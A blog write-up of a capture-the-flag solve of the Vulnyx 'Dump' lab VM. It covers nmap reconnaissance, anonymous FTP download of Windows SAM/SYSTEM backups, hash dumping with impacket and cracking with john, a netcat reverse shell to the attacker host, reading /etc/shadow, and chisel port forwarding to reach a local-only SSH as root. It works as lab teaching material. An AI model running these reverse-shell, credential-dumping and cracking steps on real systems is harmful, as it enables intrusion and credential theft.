---
title: "Writeup - Dump"
date: 2025-04-03T00:00:00+00:00
tags: ["hacking", "english","cybersec","writeups"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "A brief solution of the Dump machine"
---

This is a Vulnyx VM. As usual lets begin with basic discovery:

Arpsweep:

``` bash
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 20:10 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00014s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.00020s latency).
MAC Address: 08:00:27:E9:B5:FB (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.111
Host is up (0.00082s latency).
MAC Address: 08:00:27:2B:FF:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.19 seconds
```

So target IP is 56.111

Portscan:

``` bash
sudo nmap -sS -p- -T4 192.168.56.111 -oN portscan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 20:11 CEST
Nmap scan report for 192.168.56.111
Host is up (0.000089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
4200/tcp open  vrml-multi-use
MAC Address: 08:00:27:2B:FF:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

Service detection:

``` bash
sudo nmap -sS -A -p 21,80,4200,22 192.168.56.111 -oN servicescan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 20:12 CEST
Nmap scan report for 192.168.56.111
Host is up (0.00096s latency).

PORT     STATE  SERVICE  VERSION
21/tcp   open   ftp      pyftpdlib 1.5.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.56.111:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx   2 root     root         4096 Feb 09  2024 .backup [NSE: writeable]
22/tcp   closed ssh
80/tcp   open   http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
4200/tcp open   ssl/http ShellInABox
| ssl-cert: Subject: commonName=dump
| Not valid before: 2024-02-09T11:53:57
|_Not valid after:  2044-02-04T11:53:57
|_http-title: Shell In A Box
|_ssl-date: TLS randomness does not represent time
MAC Address: 08:00:27:2B:FF:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.96 ms 192.168.56.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.76 seconds
```

So weve got a backup folder on the FTP port, which we can get as an anon user.

``` bash
ftp> get sam.bak
local: sam.bak remote: sam.bak
229 Entering extended passive mode (|||57477|).
125 Data connection already open. Transfer starting.
100% |********************************************************| 24576       22.32 MiB/s    00:00 ETA
226 Transfer complete.
24576 bytes received in 00:00 (20.90 MiB/s)
ftp> get system.bak
local: system.bak remote: system.bak
229 Entering extended passive mode (|||49553|).
125 Data connection already open. Transfer starting.
100% |********************************************************|  3188 KiB  138.45 MiB/s    00:00 ETA
226 Transfer complete.
3264512 bytes received in 00:00 (138.01 MiB/s)
ftp> 
```

Seems fine, we can read them both via strings.

Looking at HTTP, we have no useful methods

``` bash
sudo nmap -sS --script http-methods -p 80 192.168.56.111

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 20:16 CEST
Nmap scan report for 192.168.56.111
Host is up (0.00032s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
MAC Address: 08:00:27:2B:FF:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
                                                             
```

Lets checkout the HTTPS shell in a box. We get a login to the machine (shellinabox is a framework to run commands from a web browser)

Lets use impacket to dump the SAM and SYSTEM data asuming its Windows creds (which is fair given the file names):

``` bash
impacket-secretsdump -sam sam.bak -system system.bak local

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x042145cf7279c87791fa907cd6d9bccd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:45ab968b011c0b6cfd1e9e1b30ff40cc:916da1881680fcb38f2ce951f666d6be:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:d0d506281c0dbfe0a16f57e412411d37:::
dumper:1004:ebd1b59f4f5a6843aad3b435b51404ee:7324322d85d3714068d67eccee442365:::
admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::
[*] Cleaning up... 
```

So here we have NTLM and LM hashes for users, lets crackstation this.

Dumper has the password "1dumper"

Then admin has the password blabla.

We go to the 4200 port and login:

``` bash
dump login: dumper                                                                  

Password:                                                                           

Linux dump 4.19.0-26-amd64 #1 SMP Debian 4.19.304-1 (2024-01-09) x86_64             

dumper@dump:~$ ls                                                                   

user.txt                                                                            

dumper@dump:~$ cat user.txt                                                         

[censored]
```

Sadly we cant seem to login as admin OR use su OR use sudo -l.

There's nothing on the crontab too.

But heres the thing, this is a Linux machine, and the creds were obviously Windows, so it's fair to expect we wont be able to login as admin.

``` bash
dumper@dump:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash                               
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin               
bin:x:2:2:bin:/bin:/usr/sbin/nologin                          
sys:x:3:3:sys:/dev:/usr/sbin/nologin                          
sync:x:4:65534:sync:/bin:/bin/sync                            
games:x:5:60:games:/usr/games:/usr/sbin/nologin               
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin               
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                   
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin             
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin           
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                    
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin          
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin          
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin              gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin   
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin    
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin              
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin             
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                  
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin        
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin          
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin                 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin                  
dumper:x:1000:1000:dumper:/home/dumper:/bin/bash              
shellinabox:x:106:113:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin
```

Anyways lets get a revshell with netcat:

On the target

``` bash
nc -v 192.168.56.100 4444 -e /bin/bash
```

On our host:

``` bash
nc -nlvp 4444
```

Lets get a better shell:

``` bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

I transfered LinPEAS.sh via python server and wget.

We can read shadow files (lol):

``` bash
$ cat /etc/shadow

cat /etc/shadow
root:$6$jzcdBmCLz0zF2.b/$6sok07AjDc3TN3oeI/NqrdZ6NSQly3ADW6lvs3z5q.5GDqsCypL8WtL7ARhzDcdYgukakXWeNbiIP7GyigCse/:19762:0:99999:7:::
daemon:*:18898:0:99999:7:::
bin:*:18898:0:99999:7:::
sys:*:18898:0:99999:7:::
sync:*:18898:0:99999:7:::
games:*:18898:0:99999:7:::
man:*:18898:0:99999:7:::
lp:*:18898:0:99999:7:::
mail:*:18898:0:99999:7:::
news:*:18898:0:99999:7:::
uucp:*:18898:0:99999:7:::
proxy:*:18898:0:99999:7:::
www-data:*:18898:0:99999:7:::
backup:*:18898:0:99999:7:::
list:*:18898:0:99999:7:::
irc:*:18898:0:99999:7:::
gnats:*:18898:0:99999:7:::
nobody:*:18898:0:99999:7:::
_apt:*:18898:0:99999:7:::
systemd-timesync:*:18898:0:99999:7:::
systemd-network:*:18898:0:99999:7:::
systemd-resolve:*:18898:0:99999:7:::
messagebus:*:18898:0:99999:7:::
sshd:*:18898:0:99999:7:::
systemd-coredump:!!:18898::::::
dumper:$6$8sDPsnEu5ZBa8bgE$EqxYjZuAYVmAqbusMGgx.NmwUwx0UcSVe2Z/YTRk1DqBOnxFxNbot7ktfzYxNALw8iDKXrkfV5.e54uTMgr371:19762:0:99999:7:::
shellinabox:*:19762:0:99999:7:::
```

Now we "just" need to crack it (we still cant use su)

``` bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shadow123        (root)     
1g 0:00:00:01 DONE (2025-04-03 18:02) 0.6944g/s 5688p/s 5688c/s 5688C/s somebody..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So it was shadow123

As a PoC using hashcat itd be:

``` bash
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

In linpeas we saw:

``` bash
╔══════════╣ Active Ports

╚ [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#op](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#op)

en-ports                                                                            

tcp     LISTEN   0        128              0.0.0.0:4200          0.0.0.0:*      

tcp     LISTEN   0        100              0.0.0.0:21            0.0.0.0:*      

tcp     LISTEN   0        128            127.0.0.1:22            0.0.0.0:*      

tcp     LISTEN   0        128                    *:80                  *:*
```

Which means something is actually being locally served on port 22

``` bash
dumper@dump:~$ ls -lhaF /usr/bin | grep ssh                                         

lrwxrwxrwx  1 root root       3 dic 24  2023 slogin -> ssh

----------  1 root root    715K dic 24  2023 ssh

-rwxr-xr-x  1 root root    335K dic 24  2023 ssh-add*

-rwxr-sr-x  1 root ssh     315K dic 24  2023 ssh-agent*

-rwxr-xr-x  1 root root    1,5K dic 22  2023 ssh-argv0*

-rwxr-xr-x  1 root root     11K oct 17  2018 ssh-copy-id*

-rwxr-xr-x  1 root root    407K dic 24  2023 ssh-keygen*

-rwxr-xr-x  1 root root    411K dic 24  2023 ssh-keyscan*
```

It seems we cannot run bare ssh.

A simple solution would be port forwarding any port on 0.0.0.0 to 127.0.0.1 port 22. This way we should be able to connect to it from our host (in which we can run ssh). But we cant do this SSH pivoting with nc, wed need ncat or socat (which we dont have) so we will need to run chisel.

We check the architecture via ``` uname -r ```, transfer the binary via wget and run a server with:

``` bash 
./chisel server -p 4444 --reverse
```

Now from our attacking machine:

``` bash
chisel client -v 192.168.56.111:4444 1234:127.0.0.1:22
```

Since we now have port 1234 forwarded to 192.168.56.111's loopback address's port 22 (thats to say 127.0.0.1:22) we can simply use ssh client against our loopback adress with the previously specified port:

``` bash
ssh root@127.0.0.1 -p 1234
```

And we are root.

``` bash
root@dump:~# cat /root/root.txt
[censored]
```
